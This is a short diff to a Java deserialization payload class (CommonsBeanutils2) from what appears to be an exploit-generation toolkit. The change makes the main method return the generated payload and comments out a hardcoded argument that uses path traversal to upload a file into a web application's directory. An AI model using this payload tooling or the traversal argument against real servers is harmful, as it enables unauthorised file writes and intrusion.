@@ -29,10 +29,11 @@ public class CommonsBeanutils2 implements ObjectPayload<Object>  {
         return queue;
     }
 
-    public static void main(String[] args) throws Exception {
-        args = new String[]{"upload_file_base64:..//webapps//CDGServer3//testttttt.txt|YWJjMTIz"};
+    public static String main(String[] args) throws Exception {
+//        args = new String[]{"upload_file_base64:..//webapps//CDGServer3//testttttt.txt|YWJjMTIz"};
 //        PayloadRunner.run(CommonsBeanutils2.class, args);
         String s1 = PayloadRunner.run(CommonsBeanutils2.class, args);
-        System.out.println(s1);
+//        System.out.println(s1);
+        return s1;
     }
 }
